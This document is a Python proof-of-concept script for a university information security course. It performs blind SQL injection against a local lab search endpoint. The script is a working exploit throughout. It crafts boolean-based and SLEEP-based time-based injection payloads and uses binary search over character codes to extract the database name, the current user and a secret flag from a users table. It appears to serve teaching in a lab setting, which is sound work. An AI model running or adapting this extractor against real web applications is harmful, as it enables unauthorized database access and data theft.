#!/usr/bin/env python3
"""
PoC Exploit: Blind SQL Injection (Boolean-based & Time-based with Binary Search)
Course: An Toan Thong Tin (Information Security)
Target: http://localhost:8080/search
"""

import time
import urllib.request
import urllib.parse
import sys

TARGET_URL = "http://localhost:8080/search"
SLEEP_TIME = 2.0  # Seconds for time-based delay threshold

def query_endpoint(keyword):
    params = urllib.parse.urlencode({
        "keyword": keyword,
        "category": "ALL",
        "mode": "vulnerable"
    })
    url = f"{TARGET_URL}?{params}"
    req = urllib.request.Request(url, headers={"User-Agent": "SecLab-Blind-Tester/1.0"})
    
    start_time = time.time()
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            content = resp.read().decode("utf-8", errors="ignore")
            elapsed = time.time() - start_time
            return elapsed, content
    except Exception as e:
        elapsed = time.time() - start_time
        return elapsed, ""

# ----------------------------------------------------------------------
# 1. BOOLEAN-BASED EXTRACTION
# Evaluates whether the returned page contains product records (TRUE) or not (FALSE)
# ----------------------------------------------------------------------
def is_boolean_true(condition):
    payload = f"' AND ({condition}) AND '1'='1"
    elapsed, content = query_endpoint(payload)
    # If query succeeds and matches records, result.jsp contains table rows or product names
    return "Laptop Dell XPS" in content or "MacBook Pro" in content or "<table>" in content

def get_length_boolean(expression, max_len=50):
    for l in range(1, max_len + 1):
        if is_boolean_true(f"LENGTH({expression}) = {l}"):
            return l
    return 0

def extract_string_boolean(expression):
    print(f"\n[*] [Boolean-based] Finding length of: {expression}")
    str_len = get_length_boolean(expression)
    if str_len == 0:
        print("[-] Could not determine string length via boolean checks.")
        return ""
    print(f"[+] Discovered length: {str_len} characters")

    result = []
    print("[*] Extracting characters via Binary Search: ", end="", flush=True)

    for pos in range(1, str_len + 1):
        low = 32
        high = 126
        char_code = 0
        while low <= high:
            mid = (low + high) // 2
            if is_boolean_true(f"ASCII(SUBSTRING({expression}, {pos}, 1)) > {mid}"):
                low = mid + 1
            else:
                char_code = mid
                high = mid - 1
        result.append(chr(char_code))
        print(chr(char_code), end="", flush=True)

    print()
    return "".join(result)

# ----------------------------------------------------------------------
# 2. TIME-BASED EXTRACTION
# ----------------------------------------------------------------------
def is_time_true(condition):
    payload = f"' AND IF({condition}, SLEEP({SLEEP_TIME}), 0) -- "
    elapsed, _ = query_endpoint(payload)
    return elapsed >= (SLEEP_TIME - 0.5)

def extract_string_time(expression, max_len=15):
    print(f"\n[*] [Time-based] Verifying vulnerability with SLEEP({SLEEP_TIME})...")
    if not is_time_true("1=1"):
        print("[-] Time-based delay not observed. Is the target server running?")
        return ""

    print("[+] Time-based SQLi confirmed! Extracting first few characters...")
    result = []
    for pos in range(1, max_len + 1):
        low = 32
        high = 126
        char_found = None
        while low <= high:
            mid = (low + high) // 2
            if is_time_true(f"ASCII(SUBSTRING({expression}, {pos}, 1)) > {mid}"):
                low = mid + 1
            else:
                char_found = mid
                high = mid - 1
        if char_found and char_found > 32:
            result.append(chr(char_found))
            print(f"    Char #{pos}: {chr(char_found)} (ASCII {char_found})")
        else:
            break

    return "".join(result)

def main():
    print("=" * 65)
    print(" Blind SQL Injection Binary-Search Extractor")
    print(" Course: An Toan Thong Tin (Information Security)")
    print("=" * 65)

    print("\nSelect Mode:")
    print(" 1. Boolean-based Blind Extractor (Fast, High Efficiency)")
    print(" 2. Time-based Blind Extractor (High Stealth, Latency Based)")

    choice = sys.argv[1] if len(sys.argv) > 1 else "1"

    if choice == "2":
        db_name = extract_string_time("database()", max_len=8)
        print(f"\n[🎯 EXTRACTED DATABASE NAME via TIME-BASED] -> {db_name}")
    else:
        db_name = extract_string_boolean("database()")
        print(f"[+] Database Name: {db_name}")

        user_name = extract_string_boolean("user()")
        print(f"[+] Current User: {user_name}")

        flag = extract_string_boolean("(SELECT secret_flag FROM users WHERE id=1)")
        print(f"\n[🎯 EXTRACTED ADMIN FLAG via BOOLEAN-BASED] -> {flag}")

if __name__ == "__main__":
    main()
